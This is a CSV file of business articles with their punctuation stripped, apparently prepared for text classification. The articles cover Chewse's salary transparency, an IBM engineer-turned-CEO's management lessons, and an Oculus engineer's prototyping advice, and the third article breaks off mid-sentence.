,category,text
0,business,How Chewse Operationalized Transparency   Starting With SalariesIt was middle school  Nine year old Tracy Lawrence was crouched in the bathroom  hurriedly gulping down her lunch in a stall  This was her safe haven from the bullies who gossiped about her and taunted her every day  It was also a way to avoid the humiliation of sitting alone in the cafeteria   Many years later  that memory returned to Lawrence  She had an epiphany as the now CEO of the office catering startup Chewse  Gossip may run rampant among pre adolescents  but it s not something you should have to tolerate as an adult  And the deepest  darkest secrets in a company  They re typically around compensation  So Lawrence and her cofounder  Jeff Schenck  made a decision that might have seemed counterintuitive for an early  stage startup  They put together a spreadsheet listing every employee s pay   including their own  Lawrence told her employees as they stared at her  wide eyed  that they were introducing transparency to the company  which at the time consisted of 18 people  And that it was going to start with salaries  She typed out an email and attached the spreadsheet  She closed her eyes  heart pounding  and hit  send    Nothing happened  No one freaked out  In fact  no one said anything at all   Well  okay  some things happened  In the 16 months since sending that email  Chewse s voluntary turnover has dropped by half to 10  in the first full year of implementation  Employees who resigned provided an average of 5 25 weeks of notice  compared to the national standard of two weeks  The percentage of employees who thought their compensation was fair was at 72   compared to a national average of 20   And no employee has ever approached the company with a competing job offer  thanks in part to the company s clear system of ratings  expectations setting and regularly scheduled conversations around performance and salary  Some have even told Lawrence they ve never opened the spreadsheet  It s been enough just to know that it was there   Chewse s team has doubled now to 36  and the workplace is thriving  The company nearly tripled its sales in the past year  Lawrence  who previously founded student dining guide Dish Dash and worked as a corporate event planner for TEDx  has become a champion for authentic transparency   not just in salaries  but as a company value  Here  she takes us through why even the earliest stage startups should consider an open salaries policy  especially if they care about diversity  Lawrence explains how to implement such a program  and why you should pair it with a carefully designed feedback and review system  She shares a four step process on how to give regular and constructive employee feedback that set expectations and strike the right tone  The end result  a culture of openness  fewer hard feelings around pay and clear communication channels between managers and employees   The Case for Transparent Salaries  Kicking things off with an obvious question  why consider open salaries at all  Here are the top reasons you should consider implementing a similar policy   Foundational cultural values  For starters  it s about embedding the values of transparency and fairness into your company culture from the very beginning   and laying the framework for a healthy environment  In Chewse s early days  Lawrence and Schenck debated how to best show appreciation to their employees   We considered different benefits programs  but it always came back to compensation  People really care about their comp  We wondered  what was the most authentic way to handle compensation  It only seemed right to introduce transparency   Lawrence says  And if you think this is something to hold off on until you have a fully fledged HR department  think again  This policy is especially effective for super early stage startups  That might seem counterintuitive  because with such a small staff  wouldn t there be even more sensitivity around pay   Incorporating transparency from the very start will set the tone for the organization you become  It s so critical that you hire people who want open salaries   not just as a tool  but as the type of person who appreciates that approach  You find people who say   I buy into diversity  I buy into equality and fairness   Those are the kind of people that you want to grow into leaders at your startup    Recruiting  Open salaries can improve the candidate experience and attract talent   Candidates would overwhelmingly say they really appreciate the transparency  It resonates with a certain type of person  In a survey we ran  90  of our new hires said the policy set up clear expectations for compensation and the offer process  That really says something  People often feel they re up against a black box when it comes to pay  It s verboten  You re not supposed to talk about it  We bring it straight out into the open  and we find it really impresses a lot of candidates   Lawrence says   Not only does it tell them a lot about how they ll be compensated  it says a lot about what it s like to work for us  Closed salary systems are also really hard on job candidates  It s incredibly opaque and you re negotiating in the dark  People can feel like they re fumbling  That didn t feel right to us  We want to be shoulder to shoulder with our candidates throughout the process  not be friendly  then get adversarial over comp and then assume everything will be fine again    Chewse CEO Tracy Lawrence  Retention  Transparent salaries can also go a long way in keeping employees around for longer  as they re likely to feel more satisfied with their pay   because as part of the system  you ll make it clear how it was calculated   Many people will not speak to their manager if they feel their salary is too low  They ll go and get another job offer  At Chewse  we have a system for monthly conversations about an employee s output level  which directly affects pay  It s designed to be less about someone s worth and more about their output and our formula for salary based on that   Lawrence says   It s also not going to be about waiting till December for this mythical pay raise  A raise is not going to be because you re negotiating a better offer  Nobody has ever come to us with another offer from another company and said   I want to negotiate my pay   Nobody  They ll come to us at the beginning and say they don t agree with our assessment of their output level  Great  Then we can have conversations about it  That s where we d prefer to be versus having to say   You were upset about this for six months and you went and you spun your wheels on trying to get another offer  Sure  I could ve increased your pay two grand   We don t see that happen here    Diversity  You could also see gains in this important area  Chewse has   its full time staff consists of 55  women   Women are more likely to be uncomfortable negotiating salary  I ve learned in my time as a manager that women and  for us  engineers have tended not to negotiate or negotiate not as hard  I ve always been baffled by it  because as a manager you re trained not to give your final offer  So you lowball it and you expect somebody to negotiate and then get to about the right place  That tactic doesn t really work when you have women or minority groups that just aren t comfortable with negotiation  Every time someone didn t do it  I would cringe and ask myself   If diversity is so important to me as an Asian American  female CEO  why am I hampering it at my own company    Lawrence says   If you want women and underrepresented minorities to stick around  pay them fairly and make sure they know it  It s not just the right thing to do morally  It s the right thing to do for your company  and for your employees  You ll see that people are happier  They re more at ease  Pay everyone equally and  just as importantly  make sure they know that s the case    Tech should be a role model for the way diversity works  Right now  we have a problem  One solution  open salaries   The Four Keys to Making Transparency Work  Open salaries isn t just posting everyone s comp on a bulletin board  however   There s so much more to it than that  You have to have a culture that s built on foundational transparency  This permeates everything from how often and in what way managers talk to employees to how a person can get a raise   Lawrence says   At the same time  you re not going to stop resentment entirely  But the key here is to surface it  Instead of it becoming a toxic force where no one feels they re being listened to  you know exactly who s feeling resentful about who because it s an open  shared space  Some companies will fire you for sharing your salary  Here  we say   Come talk to us about it  You don t agree with your pay  It s okay   We talk about it every single month  Since we ve implemented open salaries  we haven t been surprised about anybody leaving  especially cases that hinged on compensation  From a planning and succession point of view  especially at a startup level where things evolve very quickly  that s incredibly helpful    Here s her four step guide to how Chewse has done it   Post salary in your job descriptions   Be clear and upfront right in the beginning  Include the salary range  Because our salaries are output based  a common question we get at this stage is how do we measure output  So be specific in your job description about how you quantify the determinants of salary  Include details about your open pay system in the job description as well  For the most part  people are very excited when they hear about it  It can be a great recruiting tool   Lawrence says   This approach will also save you time  effort and heartache by filtering out people who aren t a cultural fit for your company because they re turned off by salary transparency  or who aren t a fit because they re outside of your range  It s a phenomenal filter  You waste so much time having 20 minute conversations where at the end you realize you aren t aligned on comp  You could have saved yourself a lot of time and trouble  Of course  make sure the range you post is the real range  We ve been tempted to deviate from how we determined pay for certain candidates in the past  but in the end  transparent salaries kept us honest   and hire people who best fit the company  not just the role    Excerpt of a Chewse job description  including compensation details  for a VP of Operations   Logistics  Define a ratings system  Chewse uses an A G rating system to classify its employees by skill and expected output level  An A represents someone who s fresh out of college or otherwise untested and new  while a G represents a person who s at the top of her field   perfect for the job  and a rare find   The way we measure their rating is by output  which makes it easier for managers to have these conversations  It takes a lot of the emotion out of it  Of course  how we define those levels is very dependent on the manager and the role  For sales it s about hitting a quota X percent of the time  Once that person starts to deliver  we can start to talk about moving him from a C to a D or an E  Then there are other roles like with engineering where it s a lot less based off of hard metrics  This is where the art of management comes in  It s not a science   Lawrence says   A is beginner  B is intermediate and C is performing consistently at the job standards  If someone s been hanging out in A or B for too long  that s an indicator you ve got a problem  In D  E  F and G is where you especially start to get into what s art  It s become a shorthand for the organization of how we refer to the skill levels and experiences we need  While it varies from job to job  the expected performance levels should have meaningful  nuanced milestones associated with them    Chewse s A G rating rubric  Choose the variables to determine a compensation formula  Chewse uses a formula that gives a base salary  then a multiplier based on a person s performance  The better and more high value the performance  the bigger the multiplier   We use Payscale data and AngelList data and gut check it with our network  I ll ask other founders what they re paying for certain roles  Typically for sales people and for account managers where there s a lot of those people in the role you get great data and this works fine  But in the beginning  I didn t realize how high the comp was for executive roles   Lawrence says   We went through a series of people saying our range was too low  At first we thought we just weren t finding people who understood the startup phase  But after the fourth or fifth time  we realized we weren t catching the signals from the market  It s definitely something that we ve struggled with  so we now work with a comp specialist  She s worth every penny because she helps us understand when we re underpaying  Then we nip it in the bud  We ll market test and get the data from Payscale once a year  and build our base and formula off of that    Hold monthly reflections  which double as performance discussions  Here s where the magic starts to really work   here s the space in which you create an openness that paves the way for honest  authentic conversations around an employee s work and growth   We conduct monthly one on ones with managers and employees  It s a way of doing a gut check and staying on top of whether someone is meeting their metrics  It s also a space for airing out disagreement or identifying problem areas  and to have a monthly conversation about compensation  Here  set expectations and give people specific goals around how to increase their output level   Lawrence says   Trust the framework of monthly reflections  It really does work  We had a manager who  in the process of multiple reflections  found out a person on the team was getting ready to leave  The manager initiated a conversation about output level with her  and it led to this big conversation about career progression and dissatisfaction that they were able to address  That person s still here today  and more engaged than ever    Here s Lawrence s six step approach to conducting productive monthly reflections   Start by hiring people receptive to feedback  This happens before the monthly reflection  but it s an important structural support   We hire for our values  which include fearless introspection  One question we ask in the hiring process is   What s been an important transition point in the past 18 months for you where you ve learned something about yourself   We look for instant intimacy  They don t have to tell their whole life story  but they have to be willing to get vulnerable   Lawrence says   Part of that will come if you just show receptiveness to their honesty  My managers and I all bring our own fearless introspection to the table  and we encourage others to do the same  For example  we had someone who we interviewed and she was a little bit late  She was almost in tears  I happened to be the first interview and said   Hey  what s going on for you right now   She s said   I just feel like I ve messed up and I feel like I ve failed this interview process   We hired her  Her opening up and being vulnerable that helped clinch it    Use a simple  low lift grading rubric  Chewse has a standard form that managers fill out before the one to ones  The grading rubric ranges from      check minus minus    indicating failure to perform  with immediate action necessary to address it   and      check plus plus   which means far exceeding expectations   First  managers assess work performance  which is basically your output level  The next three sections list our values  authentic connection  fearless introspection and intellectual curiosity  At each reflection  show them how you ve ranked them  I don t hide it  and I ve learned to normalize it  The first few times it feels fucking awful  You say   Listen  I gave you a check minus   and even if it s justifiable  it still feels horrible to tell someone the bad news   Lawrence says   But you know what  Every single time the person has said   Thank you for telling me that  I m so grateful that this hasn t been hidden   Then it starts to get easy  The next month maybe you ll give a check plus for rocking it  and then you do that three  six  nine months in a row  and at that point it s a signal that it s time for an output level increase  because they ve been kicking ass  While this process does take time for managers to execute  it pays dividends in employee satisfaction and expectation setting    Use the meetings to develop and grow your employees  The reflections are an opportunity for employees to discuss their growth with their managers  and get honest feedback on where they are on their trajectory   One of my managers has the bullet points for A G performance  She might say   Yeah  they re doing well at B  but they re not yet at C territory   There has to be a step change difference  For account managers  you have to be either taking an active mentorship role or you ve taken on your own individual projects in addition to your own workload   Lawrence says   Still  you don t have to fill every requirement to move to the next level   it s more of a discussion with your manager  who has a framework for measuring your performance  People sometimes pick their paths  and we tell them that there are several ways to go  You can start to take the mentorship route  becoming the future manager  The fork in the road usually happens at C   be careful when someone s been hanging out in A or B too long  And advancement has many faces  You could be a really great individual contributor who s specializing  Someone might be doing incredible work but not want to be a manager  They should still get an output increase    We re human  We can t hold everything in our head  Monthly reflections help quantify a streak of good performance   or bad   Expect   and welcome   disagreement  While this framework takes a lot emotion out of the process by linking it to performance  the issue of compensation is still a loaded one   so expect people to disagree with their reviews   We totally expect disagreement  We ve had it before and we ll have it again  It s about how you set expectations around performance and give people specific goals around how to increase their output level  That s not an easy job  Sometimes managers say   I m having all these hard conversations for the first time   but as a result of those hard conversations  people don t leave your team  We measure success not just in retention figures  but in the number of hard conversations we ve had   Lawrence says   It s about having a lot of clarity upfront  too  On your first day of the job  we give you very clear guidelines  and from there we always keep referring back to it as these conversations happen  That way there s no question of what expectations are  As long as you re thoughtful about it upfront  the system does the work for you  This process also eliminates surprises  Let s say throughout the year we re telling a sales rep   Hey  you re great at closing deals but you re struggling with upsells   It s something that we ll have reinforced in our monthly reflections  So at the six month mark  it should be no surprise when we say   I m keeping you at a C because I ve given you all this feedback that we re not yet ready to move you to a D   It gives managers an easier time of just saying that it s output    Train your managers in tone and approach  Lawrence s team uses the principles of nonviolent communication  an approach designed around compassion and empathy   We use the OFNR framework to structure feedback  observe  feel  need  request  Make an observation  state how it makes you feel  then what you need and finally cement it in a specific request  For example   I know getting from a C to a D is really important to you  so let s talk about that  I m excited for this  but I noticed you ve thrown three work parties in the last two weeks  It s making me feel like you aren t putting your all into these deadlines  What I need to feel is that you re hungry  because the organization needs it right now  We re in the middle of a financing and we need to hit revenue milestones so that we can fundraise    Lawrence says   Don t trigger a person s fight or flight response  Be empathetic but also straightforward  Set the tone from the start as a manager   I m going to be tough with you and I m going to be real with you but I m going to do it from a place of care  Always frame it from a place of care    Convene tribunals to help managers measure success uniformly  Use your weekly management meetings as opportunities to discuss   All the managers come together and talk about who they re considering for raises  We actually prioritize it at our weekly executive meetings  too  At the end we ll always save a space for anybody issuing output level increases  They ll present both the data about output and the monthly reflections  We ll ask questions  The tribunal is a tough place  We ll push back and ask for more data  or challenge each other to say   What about this person  Doesn t she deserve an output level increase   We advocate to each other   Lawrence says   It has to be unanimous  And it s a way to make sure everyone is grading by the same yardstick  If you re lagging  trust me  your employee s going to know  They ll say   My friend has an easy manager  This isn t fair   We try to keep consistency there  It s hard  but if you bring people together regularly and have them challenge each other  that s a way to keep everyone on the same level playing field  Having a timeline is important  too  People will either forget or it ll only be the squeaky wheels who get the raises  We evaluate everyone on their output at their six month mark  but if someone s rising faster  you can initiate an increase sooner    An employee s output level is the micro  but the macro is their career progression  Monthly reflections can capture both   Looking Forward  Move toward a transparent culture by making employee salaries open  This tactic can also benefit your diversity and inclusion efforts  Build a framework and structure around how you rate and evaluate employees for raises  Start with a ratings system that s tied to a worker s output level  Formulate how you ll determine compensation based on that   try a multiplier  or tinker around with your own formula  Then hold monthly reflections  which also double as performance discussions  Train your managers to speak empathetically and openly during these meetings  and in hiring  look for candidates who demonstrate a willingness to be introspective and open  Convene quarterly tribunals for managers to make their case for raises and challenge each other on their decision making    After implementing open salaries  we ve become a more healthy conflict culture  Originally  my thinking was   Can t we all just get along   What it s actually forced me to do is to recognize that conflict is inevitable  and get serious about how myself and my managers communicate when it happens  You can t avoid disagreement  What you can do is surface it  address it and talk about it early  and that s what having an open and transparent culture is all about   Lawrence says   If more companies implemented this policy  I think you d have a lot more diversity  You d have a lot more women and minorities applying for tech companies and being part of tech  Cultures would become less toxic and you d have more productive conversations faster  This is the only way innovation and inclusion can continue on together    Photography by Bonnie Rae Mills 
1,business,From C   to the C Suite  How Software Engineering Made Me A Better ExecutiveEarly in his career  Neil Lustig faced a choice  continue his fast ascent as one of IBM s most promising engineers in a satellite office or take an entry level sales position in its larger New York City location  His boss told him the move would end his career  within the company and industry  But his mentor argued the opposite  He said he d hit a ceiling without exposure to both the technical and commercial sides of the business   and that he d never lead without experiencing all the moving parts  The mentor  once a former engineer  oversaw a team of 7 000 people at the time   Lustig transferred to New York   and thrived in sales  He found that his engineering chops enabled him to explain technology in a way that moved people to action  He closed million dollar deals with clients like Citibank  and reached his annual quota in six months  Over the years  Lustig rose through the ranks to eventually lead IBM s e commerce solutions division when Lou Gerstner was at the helm  Every team he joined thereafter he earned more responsibility  as the GM at Ariba   where he helped shift the company to the cloud   to CEO and President at Vendavo to leading cross channel experience management platform Sailthru   In this exclusive interview  Lustig shares how his management code came from his days coding  and how by drawing from that expertise  he s grown into a more effective manager  He outlines everyday engineering practices that not only have helped him strategically direct companies  but develop the  soft skills  needed to lead   Decompose in order to direct  Products  like teams and companies  are systems that address complex problems  This was an important realization for Lustig when he first made the jump from an individual contributor to a manager  To tackle his new set of challenges  he leaned on decomposition or factoring  which breaks complex systems into components that are more manageable to process  tackle and address  For Lustig  this doubled as strong management philosophy   When Lustig began his first global role at Ariba  he transitioned from leading sales in New York to being responsible for finance  sales  marketing  professional services and support across Europe   I had no idea what I was doing  Leading teams in 10 countries   that all spoke different languages   was overwhelming   he says   I fell back on the team based software development approach I used as an engineer  You don t write a new system in a continuous stream  You break it down as deeply as you can into subproblems and solve each one in a sequence  Being CEO is exactly the same  In this case  I mapped it out and started with customer satisfaction because product direction and maintaining our growth rate hinged on that being understood  That opened up the challenge   and our ability to focus and coordinate our efforts to address it across the organization    Factoring is most successful not only when systems are broken into parts  but when those parts are modular and can be maintained  In the case of leaders  that means each component   in this case  team leader   is competent and can act independently  When he oversaw Europe for Ariba  Lustig spent his first weeks in London digging into the challenges each team faced and uncovering why   Your first job is to understand the problem holistically  Then  start the factoring  Dig into each facet of the problem by asking your team open ended questions  such a  Why did we lose this deal   or  Why is this customer unhappy   because they encourage and generate full  authentic answers  My favorite question to ask was  How do you know   what data or insight drove your decision    he says   As a leader  it s tempting to just ask the questions that return the answers you have predisposed in your mind  That s why it s critical to push into areas outside your expertise   not only to return to a learner s mind  but to identify just how independent your functional leaders must be  In my case  I learned with all the variations by country  I needed the Finance head to be able to direct on her own  Those discoveries from decomposition help leaders better prioritize and allocate resources    Randomly test   and deliver   via cold calls  The experience of getting randomly chosen to answer a question in class can make even the most capable students anxious  But what if you cold called to offer answers instead of ask for them   I learned a lot from former IBM CEO Lou Gerstner and his executive team  One tactic that I still employ to this day is their practice of personally calling individual contributors throughout the company   says Lustig   Once Jerry York   IBM s then CFO   called me  It was early on in my time at IBM  He asked what was getting in my way  I told him I was struggling to close a customer in the global account program  He literally said  Okay  I m on it    and hung up the phone  The bottleneck was internal and the conversation between him and me helped illuminate and fix the hold up    Senior leadership can get so disconnected from the frontlines  especially as startups scale into larger organizations  For Lustig  this habit of cold calling was akin to the random testing in software development   It s a common software testing approach where one generates random and independent inputs to test programs  It helps ensure the integrity of the system and starts to weatherproof it for when it s  out in the wild    says Lustig   It s critical for leaders to do this  as they can get so quickly disconnected from the real world  In fact  just communicating within the C Suite is akin to only testing your app in San Francisco  It narrows your vision  The IBM execs always talked to the troops  People in the trenches have a different and important perspective    When you get promoted  talk half as much and listen twice as much  You ll connect faster and further with your ears   In companies even a tenth the size of IBM  senior leaders could randomly cold call daily  and not connect with everyone in a year  When Lustig joined Vendavo  he scaled this method by organizing cross functional teams of 6 10 people  so he could meet all 150 members in person   The objective was to decrease the perception of hierarchies and friction  That started with purposely not meeting with people with their immediate teams  but instead in functionally diverse groups  No team would have a manager or manager from their team in a group with them   it made it easier for them to be members of Vendavo than a specific role in engineering or sales   says Lustig    Now  as a CEO  I don t expect one serious sit down conversation to be a silver bullet establishing open lines of dialogue from here on out   but you d be surprised how far a conversation like that goes   says Lustig   Something about a small group  casual chat not only made me more human   and not just the CEO the board brought on to make changes   but also served as a precedent that each person could reference  Throughout my seven years with the company  I d estimate 30  of the team reached out to me proactively or really opened up when we d meet  That s a significant portion of a good sized company    Neil Lustig with members of the Sailthru team  Invest in languages   become a polyglot   Engineers can debate how many programming languages are needed to be a proficient developer  but knowing more than one has its immediate benefits  As is true with linguists  being aware of at least two languages can show the strengths and limitations of each of the languages by comparison  Even if you don t fully achieve comprehension  you obtain a greater appreciation of other languages   Lustig learned this phenomenon soon after he transferred from engineering to sales at IBM   On my first day in sales  my manager gave me a challenge  Show you know more about the person  than the software   says Lustig   As an engineer  this was hard  as I knew a ton about the software  He told me that I needed to communicate in a way that people would walk away saying   This guy gets it  I want to work with him     Resonate before you educate  That doesn t mean dumbing it down  but focus on dialing in first   Every role   in engineering  sales  marketing   that Lustig has had has made him a better executive and CEO   My fluency is my biggest strength as a leader  If you can adapt your tone  cadence and diction based on people s expertise and what excites them  you re on your way   Lustig says   What s important to your customer success team and what drives them emotionally is fundamentally different than what motivates your sales team    Take how Lustig pitched the impact of Sailthru s new elasticsearch feature   a capability to adapt marketing campaigns in real time   to his engineering  sales and customer success teams   To engineers    This feature is about minimizing the time it takes to index information from five hours to seconds  From a product point of view  that an incredible improvement  It s an opportunity to tackle a big challenge and invest in the skills to do it  We re banking on this as our tech base  It s up to you to make it happen    To Sales    Elasticsearch allows customers to manipulate marketing campaigns like they ve never done before  It s a game changer for the industry  It can not only boost our customer satisfaction scores but also improve our standing in the market against the competition    To the Customer Success team   This is about customer capability and happiness  Customers have been waiting for Elasticsearch to implement strategies they ve been eager to test  We can finally help them do that   and monitor and share the results  This is where an improvement in the technology has a multi step level impact on the customer    Fluency in multiple languages doesn t mean communication is all about talk  Action will resonate more quickly with some teams  For example  when Lustig worked at Ariba  every year they awarded the company s top salesperson a year lease on a Porsche   Rolling a Porsche onto the floor and giving the winner the keys was a sight   he says   The rest of the sales team said to themselves   That s me  I m getting the keys next  and spent the year going after it  Sales is competitive and visceral  which makes a visible status symbol enticing  But that same reward wouldn t work for your engineering team  and definitely not finance  Every profile has its prize    Open source your strategic roadmap  When most leaders talk about alignment  it remains this mysterious   nearly mythical state   where teams are synchronized while scaling  They neglect to mention how much autonomy is necessary to make it work   If alignment is a process  you can control the foundation more than you can the long term outcome  So for example  like many companies  Sailthru s teams meet periodically   we do it monthly   to review our roadmap and dig into how each department is performing to hit our goals   says Lustig   We make sure to create the space for these sessions   and while we look at metrics  we frame them as conversations  asking   Are we on track  Do we need to adjust   We discuss  instead of just do a read out and report in    It may seem commonplace these days  but Neil Lustig remembers the advent of the Open Source Initiative in the late 90s   Whether you were for it or against the idea of open source software  it changed how we approached programming  Anyone could learn  change and distribute software to anyone for any reason   says Lustig   For me  the power of that is the abiding philosophy of developing in a collaborative public way  When startups share their roadmaps  they should share all of it  That s the foundation for alignment  a habit of convening and exchanging information  The cadence and common platform keeps everyone in step   not giving everyone marching orders    Here s what Sailthru covers in each of its monthly roadmap meetings   review of corporate goals and how we re tracking  review of new business closed  review of key renewals  ad hoc presentations  such as internal engagement survey data reviews  updates on go to market  campaigns or key product enhancements  shout outs where anyone can recognize individual contributors for work that they ve done that s above and beyond  open floor  where any topic can be raised and discussed  Sailthru s practice of monthly roadmap meetings has generated results   In a recent engagement survey  90  of our employees said that they understand how their daily work contributes to the company s goals  A through line from daily  individual work to overall company goals is so critical to me  I love that we are never more than 30 days away from checking in on it   says Lustig   Lastly  open sourcing your strategic roadmap entails allowing others to know   and own   more of it   I see so many CEOs and founders of early stage companies struggle with this  When you re 20 people  you touch everything  You know every customer  You make every software decision  If you re still doing that when you re 50 people  you become the bottleneck  Your involvement slows the entire company down   says Lustig   When I joined Vendavo  the CEO and founder asserted that the three of us were most experienced and should close every deal  My ambition was different  We had 20 salespeople  If they all pulled us in  we d be stuck at  15 million in annual sales  This inflection point happens in every function  engineers turned engineering managers  marketers turned VPs of marketing  You have to trust the team you ve got   and that starts with an open sourcing the plan    Victory for a leader is not being a part of every decision   Keep lean and learning  Over the decades  Lustig has seen many tide shifts in technology  It s taught him that nothing he did last year is going to work this year   and especially not next year   My first program was written on a paper tape  My next was on punch cards  Eventually  my dad brought home the Apple II   he says   What you did last year is no longer relevant  There s never good enough  There s only better    Here are a few areas where Lustig keeps an adaptable mindset in management  just as he did as an engineer and technologist   Mind your management debt   In the same way engineers revisit and refine their codebase  managers should periodically reassess their management    Former IBM executive  Jerry York once told me    Companies are like middle aged men  Left to themselves  they get fat around the middle     says Lustig   Inertia in management is the equivalent of technical debt in code  The company   like the product   still may function  but is it working  Ask yourself  if you started again  who would you hire back  How would you set up the team  Who would you invest in  You built your team for last year s business  This is this year s business    Broaden your benchmarking  As an engineer  Lustig sought to benchmark his output with other colleagues  within the company and industry   Our engineers do the same  We have a benchmark database that tells customers how their efforts measure up against their past performance  But that s not enough  We want them to show them where they stack with their digital marketing efforts among 400 of our customers   says Lustig   I try to be as intentional with how I benchmark my management style and decisions  Currently  Lustig serves on two boards  The Sealed Air Corporation and HiQ Labs  One is an Fortune 500  pubic industrial company generating about  7 billion a year and the other is 20 person startup in San Francisco  That pulls my head   and how I benchmark success   in two different directions every month    Share jobs not just information  Lustig s stints in engineering  sales and marketing has given him firsthand  function specific empathy  which has helped him tackle leadership challenges from a variety of perspectives   For a variety of reasons  not every employee will be able to work in a variety of functional areas like I did  But that shouldn t stop you from trying to replicate that experience   says Lustig   We have engineering managers shadow our customer success teams  Soon junior engineers signed up voluntarily  They started picking off all these little requests that were meaningful to customers  but just quick fixes from a technical point of view  They just needed to see and hear it firsthand    Leadership is fixating on what ships  but more on the ship itself  the organization  That s engineering at scale   Bringing it All Together  When software engineers make the jump from owning lines of code to business lines  they should lean on their developer s skill set to help guide the way  First  organizations  like software systems  are complex   use decomposition or factoring to break them down into manageable  modular units  Randomly test the integrity and health of your system by cold calling employees  This will help you calibrate your understanding of progress   roll up your sleeves to help with specific challenges as thanks  Developers should be proficient in at least one dynamic programming language  but are upleveled when they know more   the same goes with leaders who are  conversant  in all the functional areas in their organization  Open source your roadmap  clean up management debt and broaden how you benchmark your abilities    That boss who said I d end my career if I jumped from engineering to sales wasn t thinking big enough   and I m not talking about my career  Because in that way he was right   I never truly returned to software development   says Lustig   What he neglected was what might happen to others  careers   and entire company   if I transferred  As an engineer  I could ve continued to build products sequentially or equip myself to experience firsthand how teams fit together to achieve exponential growth  If I had any advice for my fellow engineers early in their careers  it d be this  Truly being  full stack  involves stepping outside of software development at some point  Take the leap  because here s the thing  you ve already got the foundation to get you there    Photography by Christos Xidias 
2,business,Six Steps to Superior Product Prototyping  Lessons from an Apple and Oculus EngineerWhen Caitlin Kalinowski joined Oculus as the head of product design engineering in 2014  her team was sweating on a challenge  design the controllers that would be paired with the hotly anticipated Oculus Rift virtual reality headset  At the time  VR was largely uncharted territory  with little precedence for what the hardware should look or feel like  Working with designers led by Oculus s industrial design head Peter Bristol  Kalinowski s team began to weigh various factors that would determine how the product would ultimately feel  For example  they wanted a broad swath of hand shapes and sizes  from the fifth percentile of females to the 95th percentile of males  to be able to hold the Touch controllers comfortably  Hands had to grip it without interfering with the connection between infrared LEDs and an external sensor  Each new parameter complicated another  the overall weight  the number of buttons  the strap on the controller  the shape and so on   This is where the magic happened  The team iterated over and over again  Some prototypes were so ugly they were literally a tube of plastic with putty stuck on it  But by the end  they d created a ring shaped controller that a user could open and close her hand on in game play  with a sensor on the thumb stick that allowed users to give a thumbs up  Even more miraculously  they d iterated enough times that when it came time for the engineering validation test  or EVT  the physical proportions of the controller were nearly perfect  Only a tweak on the diameter of the outer ring was needed   Kalinowski is a master of the prototyping process  with a deep understanding of where  when and how changes should be slotted in  from the first iteration to the last  It s made her a highly sought after engineer in Silicon Valley  Before her work at Oculus  she was the technical lead for Apple s MacBook Air and Mac Pro  She also led and shipped Facebook s Bluetooth Beacons  which power location based prompts for users   In this exclusive interview  Kalinowski discusses how and why you must define your non negotiables before starting to build prototypes  She dives deep on specific approaches for squeezing the most iterations and improvements out of the process   the more iterations  the better the product  after all  Kalinowski also lists the warning signs for two of the three bears of this process  prototyping processes that take too long  and also ones that end too quickly  Kalinowski spells out what the just right scenario looks like and lists the potholes to look out for before you hit the  ship  button  These insights apply to every product development situation  whether you re in hardware or otherwise  Let s get started   Declare Your Non Negotiables  There is a moment before you start building your product when the deadlines aren t yet set  the stakeholders are patient and the customers aren t clamoring  Use this moment to get very clear about which goals you won t bend or budge on   Before starting design work  decide what your product absolutely must do before you ll ship it  New companies are often under a lot of pressure  They don t always define their non negotiables clearly at the beginning of the product process  I see this mistake often  Unfortunately  they can get backed into a corner and be forced to ship early without having met those critical benchmarks first   Kalinowski says   Choose the product must haves first  If you do get backed into a corner and you haven t quite met them  it can be really tempting to ship anyway  Instead  start out with   The product has to do these three things  Nice to have are these next two things  A bonus are these other things   As a team  you must agree that if you don t hit those have to haves  you re not going to ship the product    Finding your have to haves often means boiling the most critical elements of a product down to one or two key features  In the case of the iPad  the product had to be lightweight enough that customers could hold it up easily   Apple worked on the iPad for years  Steve Jobs always said it was too heavy  They turned it into the iPhone  worked on that for years  shipped the iPhone  went back to the iPad  worked on that for years and finally shipped the iPad  There probably wouldn t have even been an iPhone if they hadn t had that guiding principle for the iPad  They didn t ship the earlier iPad prototypes because they were too heavy  It was tiring for your hands  It takes a lot a lot of discipline to keep developing until you nail your key features   Kalinowski says   Focus on the product and the consumer experience  On the Oculus Rift  if you didn t experience  presence   or the feeling that you re actually in your virtual environment  we weren t going to ship it  If the Oculus Rift didn t fit comfortably on a wide set of adult faces  we weren t going to ship it  Decide at the beginning  what are the goals you must hit in order to deliver those key features  As long as you achieve those product goals  you can have discussions about other matters like secondary features and whether you ll ship or delay your schedule  Share those must haves with your entire organization  Get everyone on board with the non negotiables so you re moving together towards the same goal    It s the North Star because it points the way  In product development  that s your one key product feature  Don t waver from it   No matter what  always solve for consumer experience   As a designer and an engineer  I m constantly trying to think about the customer and how much better or how much worse the product will be depending on the decisions we are making on the product level  That is how you determine your North Star  When I m thinking about product trade offs and feature trade offs  I m really thinking about the customer  I ask myself  is this change materially going to affect their experience of using this product   Kalinowski says   This is why we care so much at Oculus about ergonomics and weight  They affect the software experience and the customer s sense of presence  If you can wear the device longer  you can stay immersed  play games longer and experience more fluid social VR  The calculus of consumer experience is present in every decision from the fabric we use to how heavy the device is    Slide into a Prototyping Plan  Map out your approach to prototyping by determining your point on a speed caution slider  On one end is caution  and on the other end is speed  Which way you tilt depends on your company  what you re trying to accomplish  and where you are in your development cycle   If you re schedule driven and trying to beat a competitor to market  slide away from caution  If you re making a product with a lower volume  you can slide away from caution  For example  making 100 000 of a product versus two million changes your risk tolerance  You cannot recover from problems in the design of a two million unit product the same way you can with hundreds of thousands   Kalinowski says   If I m at Apple developing the MacBook Air  I m going to be far more cautious about risk because it s a huge  high volume product  It s expensive to recover from mistakes  If I m designing the first VR product  I m going to use less caution and be more ambitious because my volumes will be manageable enough that I ll be able to fix problems in flight  I ll try to move faster  There s a speed caution slider and you have to understand where you are in order to master your trade offs  If I m making a medical product  my caution slider s generally all the way to the left  because they typically take much longer to develop and achieve compliance  It boils down to the risks associated with what you re making and how much development time you re willing to trade to be faster to market    The speed caution slider  Your management of your team should also shift accordingly   If you re super cautious  encourage all assumptions to be checked and double checked  Say to the team   Confront each other   Ask   Is this true  Is there enough swell space for the battery  Is this flame rating correct for this part  Are you sure  Have we tested it  Have we sent the part out to a third party and verified it  Three months into the product run  will we re verify that the manufacturer hasn t changed the material on us to lower their costs    Kalinowski says   When speed is the top concern  only worry about the most critical issues  In those cases  I give a piece of paper to my people and say   Make a list of all the design issues you are worried about in ranked order   Then I rip the page under their first five and hand the top part of the page back to them and say   just focus on those      The Six Step Approach to Prototyping  Once you ve figured out your place on the speed caution slider  you re ready to start building prototypes  Your singular goal  To iterate as much as possible before the ship date  Kalinowski spells out her six step approach to building strong prototypes and how to design a process that fits in as many 